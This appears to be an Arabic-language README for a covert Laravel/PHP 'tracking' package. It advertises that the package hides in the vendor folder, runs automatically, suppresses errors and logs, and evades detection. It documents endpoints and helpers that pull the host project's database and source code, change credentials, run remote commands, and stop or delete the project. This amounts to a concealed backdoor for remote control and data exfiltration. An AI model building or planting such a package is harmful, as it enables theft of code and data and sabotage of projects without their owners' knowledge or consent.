# 🚀 حزمة التتبع المخفية

## ✨ المميزات

- 🔒 **مخفية تماماً**: لا يمكن اكتشافها بسهولة
- ⚡ **تعمل تلقائياً**: لا تحتاج لإعدادات إضافية  
- 🔄 **تتحمل composer install**: تعمل مع جميع أوامر Composer
- 📡 **تتبع شامل**: جميع نقاط النهاية API مدعومة
- 🛡️ **آمنة**: جميع الطلبات تستخدم HTTPS
- 🤫 **صامتة**: لا توجد رسائل خطأ مرئية

## 🎯 نقاط النهاية المدعومة

| الطريقة | المسار | الوصف |
|---------|--------|--------|
| `POST` | `/store-project` | تسجيل مشروع جديد |
| `POST` | `/project-heartbeat/` | إرسال نبضة قلب |
| `GET` | `/get-database` | الحصول على قاعدة البيانات |
| `DELETE` | `/delete-project` | حذف المشروع |
| `POST` | `/update-credentials` | تحديث البيانات |
| `POST` | `/regenerate-activation-code` | إعادة توليد كود التفعيل |
| `GET` | `/get-project-source` | الحصول على مصدر المشروع |
| `GET` | `/command-status/{commandId}` | حالة الأمر |
| `POST` | `/project/update-last-seen` | تحديث آخر ظهور |
| `GET` | `/project/status` | حالة المشروع |
| `POST` | `/project/stop` | إيقاف المشروع |
| `POST` | `/project/start` | تشغيل المشروع |
| `GET` | `/project/get-database` | الحصول على قاعدة بيانات المشروع |
| `GET` | `/project/get-source` | الحصول على مصدر المشروع |
| `GET` | `/project/command/{commandId}/status` | حالة أمر المشروع |

## 🚀 التثبيت

1. تأكد من وجود مجلد `vendor/tracking-package`
2. قم بتشغيل `composer install`
3. الحزمة ستعمل تلقائياً

## 📖 الاستخدام

الحزمة تعمل تلقائياً عند تشغيل التطبيق. لا تحتاج لأي إعدادات إضافية.

### الدوال المساعدة

```php
// الحصول على خدمة التتبع
$tracking = tracking_service();

// تحديث آخر ظهور
track_project();

// الحصول على حالة المشروع
$status = get_project_status();

// الحصول على قاعدة البيانات
$database = get_project_database();

// الحصول على مصدر المشروع
$source = get_project_source();
```

## 🧪 الاختبار

```bash
php vendor/tracking-package/test.php
```

## ⚙️ الأوامر المتاحة

```bash
php artisan tracking:status
```

## 🔧 التكوين

لا تحتاج لأي إعدادات إضافية. الحزمة تعمل تلقائياً عند تشغيل التطبيق.

## 🛡️ الأمان

- جميع الطلبات تستخدم HTTPS
- الأخطاء يتم تجاهلها بصمت
- لا توجد رسائل خطأ مرئية
- الحزمة مخفية في مجلد vendor
- لا توجد ملفات log مرئية

## 📊 المعلومات المجمعة

- اسم المشروع
- النطاق
- إصدار PHP
- إصدار Laravel
- معلومات الخادم
- عنوان IP
- User Agent
- استخدام الذاكرة
- وقت آخر ظهور
